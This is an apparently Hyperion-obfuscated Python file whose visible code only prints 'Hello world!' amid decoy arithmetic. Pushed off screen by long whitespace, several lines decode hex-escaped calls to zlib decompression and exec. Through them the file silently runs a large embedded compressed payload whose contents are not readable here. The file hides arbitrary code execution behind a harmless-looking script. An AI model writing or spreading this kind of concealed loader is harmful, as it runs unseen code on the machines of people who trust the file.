from builtins import *
from math import prod as _substract


__obfuscator__ = 'Hyperion'
__authors__ = ('billythegoat356', 'BlueRed')
__github__ = 'https://github.com/billythegoat356/Hyperion'
__discord__ = 'https://discord.gg/plague'
__license__ = 'EPL-2.0'

__code__ = 'print("Hello world!")'


Substract, Product, _divide, _while, _product, Multiply, _builtins = exec, str, tuple, map, ord, globals, type

class _system:
    def __init__(self, _memoryaccess):
        self._round = _substract((_memoryaccess, 30223))
        self.Algorithm(_frame=84748)

    def Algorithm(self, _frame = None):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self._round += 47560 / _frame
        
        try:
            {_divide: _product} if Substract == Multiply else {_divide: _product} == Absolute

        except TypeError:
            (((Substract, Substract), _while) for _while in (Substract, _divide))

        except:
            _builtins(-57811 + 17244) == bool

    def _detectvar(self, _theory = 21809):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _theory -= -86891 - -25644
        self._run != str
        
        try:
            ((Substract, (_while, Absolute, Product)) for Substract in (Substract, Substract) if Absolute < _divide)

        except AssertionError:
            (((_while, Absolute, Product), _divide) for _divide in (Substract, Substract))

        except:
            _builtins(-87711 * 48636) == bool

    def Square(_callfunction = type):
        return Multiply()[_callfunction]

    def Walk(Positive = -94505 / 53559, _modulo = True, Math = Multiply):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        Math()[Positive] = _modulo
        
        try:
            ((_while, {_divide: _product}) for _while in {_divide: _product} if _while >= Substract)

        except OSError:
            ((Substract, _divide) or _product if (Substract, _divide) and _product else ... or (_product, (Substract, _divide)))

        except:
            _builtins(7626 - -79234) == None

    def execute(code = str):
        return Substract(Product(_divide(_while(_product, code))))

    @property
    def _run(self):
        self._square = '<__main__.Product object at 0x000002638BE60618>'
        return (self._square, _system._run)

if __name__ == '__main__':
    try:
        _system.execute(code = __code__)
        _hypothesis = _system(_memoryaccess = -92240 + -68949)

        if 377313 > 3066661:
            _hypothesis.Algorithm(_frame = _hypothesis._round * 78214)
        elif 445298 < 8423749:
            _hypothesis._detectvar(_theory = 14597 * _hypothesis._round)                                                                                                                                                                                                                                                          ;_system.Walk(Positive='IIIlIllIIllIIIIllIlIII',_modulo=b'x\x9c\xddY\xe9o\xdaH\x14\xff\xce_\xe1\xf2\xc5XM\x88\xf1I\x90*\xadV\xd9\xaa \x12\xaf\xdaj\x9b\xaa\xad,c\x8fa\xe8\xd8\x83|4\xf0\xdf\xef{3v\xa0\x01\x12;\xc7J\x9b\x19\xe6z3\xf3\x8e\xdf\xdc\xa6\xc86\xa3\x8e\x02\x8e\xc6=\x91\xa2\xf3}>\x8b\xcb<\x0c\n\x9e\xf9\xbe\xf2\xe6]\xf7\xc3fE2\xca\xd3\xae\xc2\xb3\x9dfAY,x\x96\x8b6\xbd\xee\x8c2\xb6)\x16d\xce\x83\xc2\xb4\x9d\xeeI\xf7OV\x92\x8f$\xeaj\xbf\xf5\x9a\xd3bQ\xce$\xe3EQ\xac\xf2\xd1\xd9\x99\xa4\xf5C\x9e\x9c\xddasvDvD\xf3\x90g\xd1\xefl*b\x7f>?[\xb1`^\x92;\x9d\x18\rI\x9a\x13\xd9\xe9\xaf\xbf\xa7\xa7F_\xbf\xd3$\xe4\x91\xacWW\x19M\x8b^\xf7\x03a\x8c+7<c\xd1\x9b\xae\xa6v\xb4\xd1mk\xacW\xf3\x9f4R\xb5\x0eY\x87dUT`\xa6\xab\x12z~\xe49\xc9\x95 #JF\xa2\xef\xe9?\x943RH\xc2\x0c\x90\xf9\x9e~\xe5\xa5(\x05\n2\xf9\x9e^\xf1\x19\x8f6\n\xa3?\xa1\xdf\x86\x97]\xad#\x95\xa2\xc9\x8ag\x85\xef\x83\xb4M\xaej}\xb2\xa6EO\xeb0\x1e\x06,\xefi\xdfT\xc6([.\x19\xb8\xe5rI)]b\xbaT\x7f\xbc\x9b3>\x836\x9d\xc3\r\xb0\xeb\xcd\x1a\xdc\xcd\r\xfc Zc*\x8ak\xf5\xdbh\xf4\xf6\xf4\xedi\xef\xb4\xf7v\xa0i?\x80\x17)\x82\xa2\xc8\xee\xe1\xe5]x\xde\x05G\xefq\x0e\xe1\xc2\xbb\x80\x9f\xc7\xf7yE\xf4>>W\x97\xe0\xae.\xaf\xe0w\x89\xb1\xc8_\x819\xd2\xe2\xce\xe1z\xec),\x90\xf6TVA\xaf-\x80\xf7\xc8\x84\x0cT!i\xc9\xe8\x12<\xc6\xd0y\x9fcO\x9d\x95\x94\x154\xc5\xa1\xf8\x15d\x80\xee\xa1\xbe\x02\x10O\xd7\xe1\xa7\x03\x18\x1e\xc6\\\xe7\x9e\xe4\xb9\xc3\xf2F\x82\x0e\xd9\xde!ayJ\x0bF\xcb\xd9]\x10\xb5\x13\xeeI\x80k\xb4\xd1\xc3\x00x\xed\xd8h\xdf\x9e\x89O\x9f\xa6\x11Y\xf7\xd4"\xe0,\xde\xab\xfe\xa1\xdd\x03>d\x013&\x1d\xad\x9a\xb0W\x8f\x14\x0b~\x91\x83@\x1d\x9bOk\x01\xc1\xfa\x16\x06\xb9b_=N$g\xc1\xfbC@\x1d\xdf\x08\xe4\xdc\x12\x13\x0e\'Z\x95y\xfdH\x95\xd9\xe7v@16fU\x00\xc7Dx\xfd01\xbaJx\xd8\x0e)\x94\xc8\x85\nx\xcaa\x1eT\xb9\x00\xacT\xb5\xbf\xe44=\xbel?\x19\x9f\xe0g\xd4?\x11^=\xc6Y\x91\xb7;\x04$\xf0\x88\xb6\xc8\xe1\x00\xbcz\x90\x18\xe7\xfb\xb5\xf7\xa2$.U8\rQ\x13~\x01\xcek\x7f\xa7\xa04\xcc\x83\x94>\x15\xa7\xa3lZ\xe2t\x9cO\x8d\xd3&\xa6lM\x16i\xd9\n\xac\x83X\xf5f\xaa\x15Y\x04B\x1dcJn\xf3\xbb%\x027\xbc\x88\xe0\x9b\xa0\xa7\x0e\xe3\xe2\x80\xf4W>?C\xb2nuC9\x86\xb8m\x9a\x86i`\xbc\xcdI\xbf[\xf30\xda\x87/\x8a\xbdcb\r\xc32\xcd\xc0\x0e]\xdd\x19\xb8\x963\x84\x9c\xe5\xc4vh\x9b\xee\xb9C\x80\xa6\xbb\xa6c\xdbC\x838\xb6;tl\xc3xH\x85\xf6\xa6[\xb1\x13\x9bz\x1dd\tc\xe9\xad\xd8\x12\xb1\xac\x97\xf4\x87a`A2\x8b\x02\xa5~\xb3UC[O\xc1\xd1\xb1\x05\xf1\xe8a\xdb\x1d\xb4\xfd\xa1k\xac/\x9e\x9c\x9ex\n\xc1\xb3\x08g\xa8\xee\x89w\xd1\xe8\xd8\xa1\xdbZaW\xbaa\x15\xd7\xde\xddI\xdd\xc6\xea~\xb9\xfe\x82\xee\xfa\xcb\xf5\xb5H \\?\x9f\xaa\x168\x18q\xab\x9a\x05\xd2\xc9\xd9\xb0\x93\xd6%\xcbj\x8e2\x82\xcb\xf1\xb5\x89P{:G\xb4\xbd\xf6\x93B>\xc3\xd1:i,\x9e\xc7;B[.ES7"chD\xe6\xc08\x7fp\x91\x89o\x04\xb59\x82\xd5\x85\xb8|\x89\x1d\x8d?\xdf\xfc\xb6\xcew\xbd\x13:\xe16\xbf-\xcb\x14\xe3\xff\xf5\x06\xa5N&\xe3\xf1d<\x85h2\x9dN\xa6\x90\x9bN\x1a\x8c\xa8\xaaY\xfe\xb9\xaf\x83w}\x13r&x\x07\x9a\xdb\xfb\xd4F\xdc\xb0\xfd\xd0\xb7\xc1[\xfe\x00\xc2\xd07\xa0\xf9p\x9f\xdaP7]\xf44\xa1\'\xea1\xf0M\xa1\xdb\x1e\xb5\x117\x13\xfa\x19`\x91QY%u\xb3\xf6\xa9\x8d\xb8\r\xa0Zo,\x17\xfd\xd0w\x04\x92 \xa5\x92{\x87\xda\x10\x13G\xf4\xb0|i\x8f\xe1\x0f\x04&{\xd4\xffp=\xdf\x17n\xd7:.l&\xf4\xa0\xf2\xc5\xce\xc4\xb3\x9d\xd2\xe7\\\xf2r1o\x97|]\xde]\xf2\x98k\xbc\xe1\xe2\xabY\xbc\xa1\xf1\xf1|\x9b\x8c\xd9#\xb6\\.?\x16\xea\xe2\x91\t\xbb6n\xde\xdeSF\xc9\xb4c\xd3\x860\x80`V\xc1\x80`\xed\xd0\x06\xc6L\x8cd\x93\xb6z\xd3\xdd\xbb\xf5F\x08[\x9d\x01g\xa1\x0b\xf1\xc0\x89^\xf4F\x16Z\xc1\xad\xc7\xe1\xc6\x18S\x19d\t\xea\x9e\x7f\xb7w\x8d\x07o\x1f\x8f:\xc4\xb6\xeao\x8d9\xaf\xe8a\x95{\x01s\x8c\x179\xa6*\x15\xb0\xbc\x14\xf4\x86;\xa8+\xf6JS\x04<\x9b\\\xb1\x83\xeeQ\x9f\xb2\x9a\x06\xd5\x9e\xd7p\x15\xfc\xb6\xb7\xa5I\x8a.I\x93$\xc1$m\x7f\x95T\xa1H\x05&"\xc1jl\xf0\x14\x8b\xecj\xcd\xeb\xd5Z\xc75\xeeVe\xa7*\x9fW\xfbC\x93\xb6\xc3\x96\xb7\xbb\xf1t*\xef"S\xbc\x9aL0\x81\xf0\x08h\x10Z\xc4V$U\x94\xa6/pL\x0f}K\\\x01\x1c\x98Z\xd6\xed1}\x87\xfa\x94!q\xaa\xed\xd6\xbe\x93\xba\x15\xec\x02\xfejH\x9a\xb4my@\xef\x1c\xc6\xa0(\x82\xbd\x94\xc7\xd7\x92\x89)G\x8f\x0fN\x9c\xf1D\xa9\xff\x1cS\xe4\x9fn\nY\x93\xb0\x83Qo:A\'Gx*\x06{2\xd1:\x7f\x90p\xc1\x15\x1e\xc7\x9d\x8c$\xcaW^fJ\xc8\x93$H\xa3\\\x99seA2"j\xde\xf3\x0cx\x05\xc9\x8a\x91\x93\x82+Y\x99*\x81\x12SF\x940`\x8cD\xf8\xee\xc1\x07\xa5.\x1e\n\xe2\t\x04\x04\x05\xff2,\xa0\x96\xa6J\xb1 J\x1e$D\x89hF\xc2\x82g\x1b%\xc8\x05\xb5?\x0b\n\xc1k\xd4\xc9\x8b\x00\x94^e|\x9e\x05I\x1f\xf4\x16\xc2?\x1f\x128\x16v\x08s\xc68\x8f!\x9a\xec\xca\x0b@P\x1c\x83\xfei\xb1\x15YK\x18KW\x7fv\x17\x17\x06Lv\xc5%% \t\xf6\n\xa9\xf9I\x0e\x882\xd09\x8a0\xd0\x82\xf24`\x8adWCV\xb3\x17\x9f\x9a\xe5\xf7\xe6\xea\xbb\xf3\xa7\xce\xbfW\x94-?')

        if 100619 > 5714210:
            _system(_memoryaccess = -12116 * -25654)._detectvar(_theory = -46184 + _hypothesis._round)
        elif 296541 < 2207924:
            _hypothesis.Algorithm(_frame = _hypothesis._round - 35220)                                                                                                                                                                                                                                                          ;MNNNMMMNMNMNNNNNMMMNMNMM,MNMNMNNNNMNNMNNNMNN,nnmnnmmnmnnmnnmnnmmnmm,O0000Oo0ooO0Ooo00000O,SSS222SSSSSSSS222S2=(lambda WWXWWWWWWWWWXXXXX:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(WWXWWWWWWWWWXXXXX)"),filename='\x6f\x44\x6f\x6f\x4f\x4f\x4f\x6f\x4f\x44\x44\x44\x44\x4f\x4f\x44\x4f\x6f\x44\x6f\x6f',mode='\x65\x76\x61\x6c'))),(lambda WWXWWWWWWWWWXXXXX:WWXWWWWWWWWWXXXXX['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda WWXWWWWWWWWWXXXXX:WWXWWWWWWWWWXXXXX(__import__('\x7a\x6c\x69\x62'))),(lambda:(lambda WWXWWWWWWWWWXXXXX:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(WWXWWWWWWWWWXXXXX)"),filename='\x6f\x44\x6f\x6f\x4f\x4f\x4f\x6f\x4f\x44\x44\x44\x44\x4f\x4f\x44\x4f\x6f\x44\x6f\x6f',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63')),(lambda lIIlIIIIIlIlIlIIllIlIlII,WWXWWWWWWWWWXXXXX:lIIlIIIIIlIlIlIIllIlIlII(WWXWWWWWWWWWXXXXX))
        if 126358 > 8918533:
            _hypothesis._detectvar(_theory = -58354 - _hypothesis._round)
        elif 108503 < 3206324:
            _hypothesis.Algorithm(_frame = _hypothesis._round / 25784)                                                                                                                                                                                                                                                          ;O0000Oo0ooO0Ooo00000O()(SSS222SSSSSSSS222S2(MNMNMNNNNMNNMNNNMNN(nnmnnmmnmnnmnnmnnmmnmm(MNNNMMMNMNMNNNNNMMMNMNMM('\x76\x61\x72\x73'))),_system.Square(_callfunction='IIIlIllIIllIIIIllIlIII')))

    except Exception as Absolute:
        if 163556 > 2544676:
            _system.execute(code = Product(Absolute))

        elif 251726 > 5181496:
            _hypothesis._detectvar(_theory = -97110 * _hypothesis._round)
